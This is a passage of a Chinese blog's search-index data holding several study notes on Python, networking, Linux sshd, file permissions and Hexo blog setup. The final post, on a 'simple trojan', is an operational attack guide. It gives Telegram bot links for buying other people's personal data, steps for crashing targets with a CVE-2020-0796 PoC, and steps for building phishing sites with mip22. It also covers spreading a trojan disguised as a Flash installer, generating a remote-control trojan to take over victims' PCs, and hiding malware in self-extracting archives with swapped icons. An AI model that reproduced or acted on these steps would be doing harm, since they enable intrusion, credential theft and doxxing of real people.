提前部署利用正则表达式，和html的一些规律，(?P&lt;name&gt;.*?)意思是将这里匹配到的数据用name储存起来， result = obj.finditer(pagesoure) # 将源代码用finditer()过滤成迭代器 for item in result: # 开始迭代迭代器里面的内容 name = item.group(&quot;name&quot;) # 将迭代出的数据包装成name输出 daoyan = item.group(&quot;daoyan&quot;) year = item.group(&quot;year&quot;).strip() score = item.group(&quot;score&quot;) con = item.group(&quot;con&quot;) f.write(f&quot;&#123;name&#125;,&#123;daoyan&#125;,&#123;year&#125;,&#123;score&#125;,&#123;con&#125;\\n&quot;) print(name, daoyan, year, score, con)f.close()res.close()","categories":[{"name":"python笔记","slug":"python笔记","permalink":"http://zhoumuyun.com/categories/python%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"网络基础","slug":"网络基础","date":"2023-12-09T11:19:55.000Z","updated":"2023-12-10T06:32:37.326Z","comments":true,"path":"2023/12/09/网络基础/","link":"","permalink":"http://zhoumuyun.com/2023/12/09/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","excerpt":"这篇介绍了网络地址的划分和范围，数据包的流向，osi模型，虚拟网卡和路由表的作用，proxifer和wireshark的使用","text":"这篇介绍了网络地址的划分和范围，数据包的流向，osi模型，虚拟网卡和路由表的作用，proxifer和wireshark的使用 IP地址划分网络地址分为五个段，一般使用的是三个类，D类和C类不常用 A类IP地址：在IP地址的四段号码中，第一段号码为网络号码，剩下的三段号码为本地计算机的号码。所以A类IP地址的网络地址数量少，只有126个网络，但每个网络可以容纳的主机数量有1600多万台。127.255.255.255是广播地址。 B类IP地址：B类IP地址的前2个字节代表网络地址，后2个字节代表主机地址，这类IP地址适用于中等规模的网络，有16384个网络，每个网络所能容纳的计算机数为6万多台 C类IP地址：C类IP地址的前三段为网络号码，剩下的一段号码为本地计算机号码。所以C类网络地址数量较多，有209万多个网络，适用于小规模的局域网络，每个网络可以容纳254台计算机 D类IP地址：D类IP地址在历史上叫多播地址，也叫组播地址。在以太网中，多播地址命名了一组应该在这个网络中应用接收到一个分组的站点。多播地址的最高位必须是“1110”，范围从224.0.0.0到239.255.255.255。 ABC段都保留了一部分地址供我们私网使用 数据包怎么到你想要访问的服务器 数据包的流向：私网IP地址–&gt;路由器–&gt;光猫转化为公网IP–光纤–&gt;云–&gt;百度的公网IP 一般的内网怎么划分的学校的内网用一个IP将内网分配 路由和IP分配路由有静态路由和动态路由 静态路由:自己设定的下一跳，然后路由跟着自己的下一跳去走 动态路由:路由器自己分配最优路径，下一跳为动态分配 IP分配有静态ip和动态(DHCP)IP地址分配 静态IP：自己设置ip地址 动态ip：dhcp配置地址 当一个内网里面，IP相同，会发生冲突，有可能会两台主机都上不了网 osi模型 路由表的作用教室1的PC1要是想连接教室2的PC2， 经过路由器1 路由器1配置路由表指向路由器2 路由器2中有PC2的mac地址 然后路由器2的下一跳就到PC2 虚拟网卡的作用 桥接：借用主机的网卡地址进行通信 nat：转化为虚拟地址，通过虚拟网卡与主机通信，从而与外界上网 代理的搭建打开proxifer软件 点击上面的配置文件————》代理服务器 点击添加 地址配置本地地址，端口是clash上面的代理端口 第二步 打开配置文件–&gt;&gt;代理规则–&gt;&gt; 设置成ssh的代理 wireshark的使用打开wireshark，监听本地上网端口 输入自己要过滤的包","categories":[{"name":"上课笔记","slug":"上课笔记","permalink":"http://zhoumuyun.com/categories/%E4%B8%8A%E8%AF%BE%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"python的函数说明","slug":"python的函数说明","date":"2023-12-03T08:22:58.000Z","updated":"2023-12-03T08:24:12.746Z","comments":true,"path":"2023/12/03/python的函数说明/","link":"","permalink":"http://zhoumuyun.com/2023/12/03/python%E7%9A%84%E5%87%BD%E6%95%B0%E8%AF%B4%E6%98%8E/","excerpt":"此篇介绍了函数的参数、函数的作用域、闭包、函数的装饰器、迭代器、推导式、生成器、匿名函数、内置函数","text":"此篇介绍了函数的参数、函数的作用域、闭包、函数的装饰器、迭代器、推导式、生成器、匿名函数、内置函数 函数的参数列表传入函数有对应的方法*arg表示传递任何参数 **kwarg传递任何字典参数 *,**\\表示接受所有参数，打包成元组和字典 *args一定是一个元组，**kwargs一定是一个字典 12345stu_list = [&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;]def func(*arg):#*代表传递任何参数 print(arg)func(*stu_list)#*在实参位置，把列表打成位置参数进行传递，但是很不常见 #**在实参位置，可以把字典自动转化为关键字参数进行传递 关于return返回值：函数执行之后，会给调用方一个结果，这个结果就是返回值 1，如果函数内没有return，此时外界收到的None 2，函数只要执行到了return，函数就会立即停止并返回内容，函数内的return的后续代码不会执行 3，如果写了return ​ 只写了return，后面不跟数据，此时收到的依然是None ​ return 值，此时表示函数有一个返回值，外界能够接收到一个数据 ​ return 值1，值2，值3…..，此时函数有多个返回值，外界收到的是一个元组 123456def func(): print(123) return #会让程序停止，后续代码不会继续执行，类似循环里面的break print（456）ret = func()print(ret)#这里的函数代码指挥执行到123 1234def func(): return 1,2,3,4ret = func()print(ret) #收到的是一个元组数据 (1,2,3,4) 函数的作用域global:在局部（在函数中），引入全局变量 nonlocal：在局部，引入外层的局部变量，从内到外，一层一层往外找。如果有就引入，如果没有就继续向外，直到全局（不包括全局） 1234567def func(): a = 10 def func2(): a = 20 def func3(): nonlocal a #这里引入的是fun2的a a =30 #更改的是func2中a的值 123456a = 10def func(): global a #把全局变量引入到局部 a = 20func()print(a) #这里a就更改为20了 闭包1，可以让一个变量常驻于内存 2，避免全局变量被修改 123456789def func(): a = 10 #变量在函数体内部，不能通过global去修改，只能调用inner函数 def inner(): nonlocal a #应用上一次的变量a return a return inner #返回 调用inner函数ret = func() #返回了一个a值r1 = ret()print(r1) 函数的装饰器装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数&#x2F;类对象 在运行函数前，将函数传入到装饰器里面，会先运行这个函数前的装饰器 比较适应于登录验证操作 1234567891011121314def wrapper(fn):#wrapper 装饰器 fn 目标函数 def inner(*arg,**kwargs):#*,**表示接受所有参数，打包成元组和字典 #在目标函数执行之前... ret = fn(*args,**kwargs) #目标函数 #在目标函数执行之后... return ret return inner#注意不能加()@wrapper #声明装饰器def target(): passtarget() # =&gt; inner()#将target传入wrapper(),wrapper(target)&gt;inner()#一个函数可以被多个装饰器装饰 #规则和规律 wrapper1 wrapper2 tagert wrapper2 wrapper1 12345678910111213141516171819202122def guanjia(game):#guanjia里面的game是形参 def inner(*args,**kwargs):#任何传递给inner的位置参数都会被args所接受，所有的关键字参数都被kwarg所接受 print(&quot;打开外挂&quot;) game(*arfs,**kwargs)#将形参的函数这里打开 v实参 #将一个元组或者字典一个个打开成位置参数和关键字参数 print(&quot;关闭外挂&quot;) return inner@guanjia #play_dnf = guanjia(play_dnf) 这里通过装饰器包装，这里的play_dnf是实参 def play_dnf(username ,password): print(&quot;我要开始玩dnf了&quot;,username ,password) print(&quot;你好啊，我叫赛利亚，今天是美好的一天&quot;！) @guanjia #play_lol = guanjia(play_lol)def play_lol(username,password,hero): print(&quot;我要开始玩lol了。&quot;,uesername,password,hero) print(&quot;德玛西亚&quot;)play dnf(&quot;admin&quot;,&quot;12345&quot;) #实际上是传入inner()里面play dnf(&quot;admin&quot;,&quot;232131&quot;,&quot;大盖伦&quot;)#因为玩每个游戏的所要调用的参数不同 所以inner()就要里面就要用*,**来接受所有参数 12345678910111213141516171819202122def wrapper1(fn): def inner(*args,**kwargs): print(&quot;这里是wrapper1进入&quot;) #第一步 ret = fn(*args,**kwargs): #进入wrapper.inner print(&quot;这里是wrapper1退出&quot;)#第五步 return ret return innerdef wrapper2(fn): def inner(*args,**kwargs): print(&quot;这里是wrapper2进入&quot;) #第二步 ret = fn(*args,**kwargs):#进入target print(&quot;这里是wrapper2退出&quot;)#第四步 return ret return inner@wrapper1@wrapper2def target(): print(&quot;我是目标&quot;)#第三步target()#输出 这里是wrapper1进入 这里是wrapper2进入 我是目标 这里是wrapper2退出 这里是wrapper1退出 迭代器terabl:可迭代的东西 .iterator:迭代器 可迭代的数据类型：str,list,tuple,dict,set,open() 可迭代的数据类型都会提供一个叫做迭代器的东西，这个迭代器可以帮我们把数据类型中的数据逐一的拿到 获取迭代器的两种方案： iter()内置函数可以直接拿到迭代器 next() 从迭代器里面拿到数据 __iter()__特殊方法 __next()__特殊方法 for循环里面一定是要拿迭代器的，所有不可迭代的东西不能用for循环 for循环里面一定有__next__出现 总结：迭代器统一了不同数据类型的遍历工作 迭代器本身也是可以迭代的 迭代器本身的特性： 1.只能向前，不能反复 2.特别节省内存 3.惰性机制 推导式简化代码，节省内存 语法： ​ 列表推导式：[数据 for循环 if判断] ​ 集合推导式：{数据 for循环 if判断} ​ 字典推导式：{k:v for循环 if判断} 不要不推导式妖魔化. (数据 for循环 if判断) —&gt; 不是元组推导式，根本就没有元组推导式。这个东西是生成器表达式 12345678910111213141516171819lst = []for i in range(10): lst.append(i)print(lst)#改成推导式lst[i for i in range(10)]print(lst)#请创建一个列表[1,3,5,7,9]lst[i for i in range(10) if i%2!=0]lst2 = [i for i in range(1,10,2)] #range(起始值，结束值，步长)#生成20件衣服lst = [f&quot;衣服&#123;i&#125; for i in range(20)&quot;]#将如下列表中所有的英文字母修改成大写lst3 = [&quot;bob&quot;,&quot;tom&quot;,&quot;tony&quot;,&quot;kevin&quot;]lst4 = [item.upper() for item in lst3]#请将下列的列表修改成字典，要求索引作为key,数据作为valuelst5 = [&quot;林俊杰&quot;，&quot;周杰伦&quot;,&quot;林志玲&quot;,&quot;刘德华&quot;,&quot;梁朝伟&quot;]dic6 = &#123;i:lst5[i] for i in range(len(lst5))&#125;#只要是代码可以调用的，都可以去试着调用，别局限思维 生成器语法:(数据 for循环 if判断) &gt;迭代器的特性，一次性的 12345678gen = (i**2 for i in range(10))#这是一个生成器 genderator 也是一个迭代器#gen.__next__() #调用next方法逐个取出数据 一次取出一个for item in gen: print(item)#生成器本质上是一个迭代器 ！！！！利用for循环取出后，里面的数据就没有了 lst = list(gen)#把迭代器转为列表print(lst)#输入这个列表就为空了，for循环已经把迭代器里面的内容全部取出来了，此时迭代器已经没内容了 生成器函数中有一个关键字yield 生成器函数执行的时候，并不会执行函数，得到的是一个生成器 yield:只要函数中出现了yield,他就是一个生成器函数 作用： 1，可以返回数据 2，可以分段的执行函数中的内容，通多__next__()可以执行执行到下一个yield位置 匿名函数lambda表达式 语法：变量 &#x3D; lambda 参数1,参数2,参数3…:返回值 j &#x3D; lambda a,b: a+b 内置函数zipzip：可以把多个 可迭代内容进行合并 e g.多个列表一起的话，可以将每个相应项和并 12345678910111213141516lst1 = [&#x27;梁朝伟&#x27;,&#x27;张国荣&#x27;,&#x27;周星驰&#x27;]lst2 = [&#x27;40&#x27;,&#x27;38&#x27;,&#x27;45&#x27;]lst3 = [&quot;重庆森林&quot;,&quot;阿飞正传&quot;,&quot;007&quot;]#没用函数的方法res = [] #创建一个列表放置数据for i in range(len(lst)):#迭代每个数据的位置 one = lst1[i] two = lst1[i] three = lst1[i] res.append((one,two,three))print(res)res = zip(lst1,lst2,lst3)#是一个迭代器#用迭代方法取出数据for item in res: print(item)#将每一类输出lst4 = list(res) #list()方法，将输出的东西生成一个列表 locals()函数和globals()函数12345678910111213a = 188print(locals()) #此时locals被写在全局作用域范围内，此时看到的就是全局作用域中的内容def func(): a=226 print(locals())#此时locals放在局部作用于范围，看到的就是局部作用域的内容func()c = 12print(globals())def func(): a = 36 print(globals()) #输出的还是当前全局范围的参数，global只能看全局范围的参数func() sorted：排序sorted() 作为 Python 内置函数之一，其功能是对序列（列表、元组、字典、集合、还包括字符串）进行排序。sorted() 函数的基本语法格式如下：list &#x3D; sorted(iterable, key&#x3D;None, reverse&#x3D;False) 其中，iterable 表示指定的序列，key 参数可以自定义排序规则；reverse 参数指定以升序（False，默认）还是降序（True）进行排序。sorted() 函数会返回一个排好序的列表。 123lst1 = [32413,523535,6,36346627,222,525]lst2 = sorted(lst1)print(lst2)#生成[6, 222, 525, 32413, 523535, 36346627] filter:过滤filter()函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。 fliter(function ,iterabel) 将iterabel(可迭代对象)的每一项数据拿出来交给前面函数执行 参数： 接受两个参数，第一个为函数，第二个为序列（可迭代对象），序列的每个元素作为参数传递给函数进行判断，然后返回True或False，最后将返回True的元素放到新列表中。 function 判断函数，interable 可迭代对象 和map不一样，只负责筛选，不会计算 12345lst = [&quot;周杰伦&quot;,&quot;周笔畅&quot;,&quot;周迅&quot;,&quot;张杰&quot;,&quot;黄渤&quot;]f = filter(lambda x : x.startswith(&quot;周&quot;),lst)#本质上filter是一个生成器#匹配姓周的名字print(list(f)) #startswith() 匹配开头数据#x.startswith(&quot;周&quot;), filter函数会筛选出开头为周的成员 map:映射将列表的东西给函数去计算 1234lst = [1,2,3,4,5,6,7]res = [item*item for item in lst]#推导式r = map(lambda x : x * x,lst) print(r) #x^2","categories":[{"name":"python笔记","slug":"python笔记","permalink":"http://zhoumuyun.com/categories/python%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"Linux的sshd服务和文件的属性","slug":"linux","date":"2023-12-02T13:30:40.000Z","updated":"2023-12-03T08:28:01.304Z","comments":true,"path":"2023/12/02/linux/","link":"","permalink":"http://zhoumuyun.com/2023/12/02/linux/","excerpt":"此篇介绍了sshd的服务配置，Linux的文件属性","text":"此篇介绍了sshd的服务配置，Linux的文件属性 Linux的sshd服务查看ssh服务的状态 service sshd status 如果出现 Loaded: error (Reason: No such file or directory)，说明没有安装ssh服务如果出现Active: inactive (dead)说明已经安装了ssh服务，但是没有开启。按照第三步：开启ssh服务安装ssh服务yum -y install sshd 开启ssh服务systemctl start sshd 执行完命令后，用第一步：查看ssh服务状态的命令，如果出现以下提示Active: active (running) since Sun 2013-04-07 13:43:11 CST; 15s ago 说明你的ssh服务已经启动了 进入ssh配置文件更改vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config 光标移动到38行 ，将38行的#删掉 Windows连接打开poweshell ,输入ssh &#x72;&#111;&#x6f;&#116;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#50;&#x30;&#48;&#46;&#49;&#x33;&#49;(目标主机地址) Linux文件属性linux用户对文件的权限(permission)分为读read、写write、执行execute和无权限。其中超级用户root拥有超级权限，对任何文件都具有读写执行的权限。 从文件的角度来讲，linux用户又分为三种，分别是文件拥有者owner、文件所属用户组group、其他用户others 运行ll指令时 每个字段分别代表 文件类型与权限 文件硬链接计数 文件所有者 文件所属用户组 文件大小 文件时间 文件名 文件类型与权限字段共有十个字符文件类型与权限第一个字符为文件类型属性-表示该文件为普通文件(regular file);d表示该文件为目录(directory);l表示该文件为指向其他文件的链接文件(link);b表示该文件为可随机访问的块设备文件(block);c表示该文件为只能按照字符顺序访问的字符设备文件(character);s表示该文件为用于数据传输的socket文件(socket);p表示该文件为用于先进先出方式数据传输的fifo文件(fifo); 九个字符rwxrwxrwx为文件权限属性,文件的权限包括读(r)、写(w)、执行(x)和无(-)权限每一组都是r、w、x和-字符的组合，r表示读权限，w表示写权限，x表示执行权限，－表示无权限 文件硬链接计数文件链接分为硬链接和软链接，该字段为文件的硬链接计数 文件所有者表示该文件的拥有者账号，文件拥有者都是在&#x2F;etc&#x2F;passwd文件中记录的合法用户账号 文件所属用户组文件所属用户组的作用是用来规定不是文件拥有者但是加入到该用户组中的用户对该文件的权限。文件大小文件时间字段表示文件的创建日期或者最后修改日期 文件名文件名以.开头的文件表示该文件是隐藏文件，其中.表示当前目录, ..表示上一级目录","categories":[{"name":"linux笔记","slug":"linux笔记","permalink":"http://zhoumuyun.com/categories/linux%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"怎么搭建自己的hexo博客","slug":"怎么搭建自己的hexo博客","date":"2023-12-02T08:31:06.000Z","updated":"2023-12-03T08:40:31.665Z","comments":true,"path":"2023/12/02/怎么搭建自己的hexo博客/","link":"","permalink":"http://zhoumuyun.com/2023/12/02/%E6%80%8E%E4%B9%88%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/","excerpt":"此篇介绍怎么用hexo和github搭建自己的博客，包括下载安装node、git、配置hexo、利用picgo做出自己的图床、配置typora","text":"此篇介绍怎么用hexo和github搭建自己的博客，包括下载安装node、git、配置hexo、利用picgo做出自己的图床、配置typora 安装node提前安装好(node.js)[https://nodejs.org/en] 点击左边的那个 20.10.0 安装GIt提前安装好(GIt)[https://git-scm.com/downloads] 1，进入网站，点击home 2，点击downloads 3，下载相应系统的版本 4，根据自己的处理器下载 提前注册一个GitHub账号 配置hexo1，创建一个目录放源文件，路径不要有中文 2，在当前目录(D:hexo)下进入cmd界面 3，使用npm命令安装Hexo, ​ npm install -g hexo-cli ​ hexo init blog​ cd blog​ hexo g 这是构建好后的目录 4，在cmd界面输入ssh-keygen -t rsa -C “邮件地址” 这里的邮件地址是GitHub的注册邮箱，成功后直接默认三次回车后，会在用户目录下生成C:\\Users\\19279.ssh 5，进入用户下的C:\\Users\\19279.ssh 6， 用记事本打开id_rsa.pub,将里面的密钥进行全选复制 7，打开GitHub设置，点击SSH and GPG keys选项，点击右上角New SSH key 8，将id_ras.pub里面的密钥复制到 9， 测试ssh -T git@github.com，看能不能连通，出现提示后表示已经接通 10，在hexo根目录也就是D:\\hexo\\blog，上面打开任务管理器下载hexo工具 npm install hexo-deployer-git –save 11，继续配置GitHub用户名和注册邮箱 git config –-global user.name “liuxunzhang”&#x2F;&#x2F; 你的github用户名，非昵称git config –-global user.email “xxx@qq.com“&#x2F;&#x2F; 填写你的github注册邮箱 12，在github上创建一个存储库 13， 存储库命名为GitHub的用户名＋github.io 14，打开hexo根目录，我这里是D:\\hexo\\blog，找到_config.yml文件，定位到文件最后，将最后改成这种形式 这是hexo的指令hexo n “我的博客” &#x3D;&#x3D; hexo new “我的博客” #新建文章hexo new page “pageName” #新建页面hexo g &#x3D;&#x3D; hexo generate #生成hexo s &#x3D;&#x3D; hexo server #启动服务预览hexo d &#x3D;&#x3D; hexo deploy #部署 hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令hexo version #查看Hexo的版本hexo generate #生成静态页面至public目录 hexo s -g #生成并本地预览hexo d -g #生成并上传 picgo图床的配置1，进入这个网站https://github.com/Molunerfinn/PicGo/releases 我这里下载的是picgo-setup-2.4.0-beta.6.exe版本 2，下载安装到一个文件夹，后面要用上 3，在GitHub新建一个存储库作为图床 4，点击头像&gt;打开setting&gt;GitHub&gt;打开最下面的Developer Settings&gt;Personal access tokens&gt;Token（classic) 5，点击右上角Generate new token&gt;Generate new token(classic) ​ 将里面的改成这样，名字可以随便取 6，生成token后全选复制&gt;然后打开picgo&gt;图床设置&gt; 名字可以随便取 仓库名是自己GitHub图床的名字 分支名字这里是main Token就是上面复制到那些 存储路径在自己的盘里面 7，将这个图床设置为默认图床 配置Typora1，打开typora&gt;点击文件&gt;打开偏好设置&gt; 2，打开图像设置 勾选前面四个&gt;将商创服务改成picgo,路径改成picgo的安装包位置","categories":[{"name":"怎么创建自己的博客","slug":"怎么创建自己的博客","permalink":"http://zhoumuyun.com/categories/%E6%80%8E%E4%B9%88%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"}],"tags":[{"name":"分享","slug":"分享","permalink":"http://zhoumuyun.com/tags/%E5%88%86%E4%BA%AB/"}]},{"title":"简单的木马病毒","slug":"new","date":"2023-12-01T12:42:09.000Z","updated":"2023-12-03T08:43:52.278Z","comments":true,"path":"2023/12/01/new/","link":"","permalink":"http://zhoumuyun.com/2023/12/01/new/","excerpt":"此篇包括telegram社工群的地址，永恒之黑的使用，利用mip22制作钓鱼网站，制作网页传播木马，伪装木马，压缩包携带木马，压缩包木马更换图标","text":"此篇包括telegram社工群的地址，永恒之黑的使用，利用mip22制作钓鱼网站，制作网页传播木马，伪装木马，压缩包携带木马，压缩包木马更换图标 社工库的电报群地址利用telegram进入社工群，获取他人信息 电报机器人群聊链接 社工庫机器人: t.me&#x2F;aishegongkubot?start&#x3D;AISGK_HBEIR85Xhttps://t.me/DATA_007bot?start=8989324940https://t.me/pingansgk_bot?start=ee95c5680fhttps://t.me/JokerSGKbot?start=87OE61VQhttps://t.me/PyramidNetBot?start=pRg3K08https://t.me/XingDun2Bot?start=4eoHoLE永恒之黑利用python打开代码让别人的电脑蓝屏 下载老师给的CVE-2020-0796-PoC 解压 打开解压的目录 在目录打开终端（在上面输入cmd进入终端） 安装打开文件所需要的模块 cryptography 运行文件，系统会提醒缺少什么模块 在后面添加源可以让pip下载更快（&#x2F;-i https://pypi.tuna.tsinghua.edu.cn/simple) 输入代码 python CVE-2020-0796.py ＋IP地址(目标主机的IP地址) 利用mip22制作钓鱼网站配置网络代理打开Allow LAN开关 找到自己的代理的IP(Allow LAN)英文旁边的连接符（三角形）和代理端口（port) 进入Linux shell设置代理，让Linux虚拟机能够访问到GitHub vim &#x2F;etc&#x2F;proxychains4.conf 用vim编辑器打开代理文件 找到最后一行 将socks4改为socks5 ＋ clash上的代理地址和端口 proxychains4 git clone https://github.com/makdosx/mip22 利用代理网络在GitHub下载mip22 proxychains4 -q bash .&#x2F;mip22.sh 执行mip22 进入mip22界面 按1进入钓鱼界面网站 输入序号选择钓鱼网站 按3开始收集信息 利用网页传播木马在虚拟机下载安装phpstudy软件 在首页打开Apache 点开网站&gt;管理&gt;打开根目录 把www目录里面的东西全部删除 创建index.html文件 打开vscode,创造html的模板，在中间输入 导入flash.js文件，在文件代码最下方代码 “href&#x3D;”地址改成自己虚拟机的地址 加上点击后要下载文件的名称。 这里是 href&#x3D;’192.168.200.128&#x2F;flash.exe’ :从192.168.200.128访问，跳出flash.exe下载 进入网站后弹出flash木马，点击即下载flash.exe 伪装网站让木马更加真实打开kali linux proxychains4 -q bash .&#x2F;mip22.sh(这里进入了相对目录下，在mip22目录下) 在虚拟机kali打开mip22 进入钓鱼网站界面，下载钓鱼网站 将这两个文件打包压缩，然后将压缩包剪切到 C:\\phpstudy_pro\\WWW，进行解压缩 将html文件改成index.html,并在里面插入 利用大灰狼远程控制系统关闭自身的病毒查杀和防火墙 解压大灰狼压缩包 打开大灰狼 输入自己的IP地址 生成木马文件 发送到目标电脑 目标电脑点击后 可以控制对方 利用压缩包携带木马文件准备好想要伪装的软件安装包和木马 这里将flash安装包和木马一起压缩，勾选创建自解压格式压缩文件 点击高级&gt;自解压选项 在常规选项输入计算机的目录：C:\\windows\\temp（解压的地方） 打开设置选项，输入两个文件解压后的路径 C:\\windows\\temp\\flashcenter_pp_ax_install_cn.exe C:\\windows\\temp\\flash.exe 给压缩包换图标，让病毒更加真实下载Restorator，把想要换图标的两个包拖到软件 把要替换的图标替换过去，然后保存","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zhoumuyun.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]}],"categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"},{"name":"前端","slug":"前端","permalink":"http://zhoumuyun.com/categories/%E5%89%8D%E7%AB%AF/"},{"name":"python笔记","slug":"python笔记","permalink":"http://zhoumuyun.com/categories/python%E7%AC%94%E8%AE%B0/"},{"name":"前端笔记","slug":"前端笔记","permalink":"http://zhoumuyun.com/categories/%E5%89%8D%E7%AB%AF%E7%AC%94%E8%AE%B0/"},{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/categories/%E7%AC%94%E8%AE%B0/"},{"name":"上课笔记","slug":"上课笔记","permalink":"http://zhoumuyun.com/categories/%E4%B8%8A%E8%AF%BE%E7%AC%94%E8%AE%B0/"},{"name":"linux笔记","slug":"linux笔记","permalink":"http://zhoumuyun.com/categories/linux%E7%AC%94%E8%AE%B0/"},{"name":"怎么创建自己的博客","slug":"怎么创建自己的博客","permalink":"http://zhoumuyun.com/categories/%E6%80%8E%E4%B9%88%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"},{"name":"网络安全","slug":"网络安全","permalink":"http://zhoumuyun.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://zhoumuyun.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"工具介绍","slug":"工具介绍","permalink":"http://zhoumuyun.com/tags/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"},{"name":"打靶机","slug":"打靶机","permalink":"http://zhoumuyun.com/tags/%E6%89%93%E9%9D%B6%E6%9C%BA/"},{"name":"javascript","slug":"javascript","permalink":"http://zhoumuyun.com/tags/javascript/"},{"name":"sql注入","slug":"sql注入","permalink":"http://zhoumuyun.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"图书管理系统","slug":"图书管理系统","permalink":"http://zhoumuyun.com/tags/%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"name":"PHP配置和交互","slug":"PHP配置和交互","permalink":"http://zhoumuyun.com/tags/PHP%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BA%A4%E4%BA%92/"},{"name":"分享","slug":"分享","permalink":"http://zhoumuyun.com/tags/%E5%88%86%E4%BA%AB/"}]}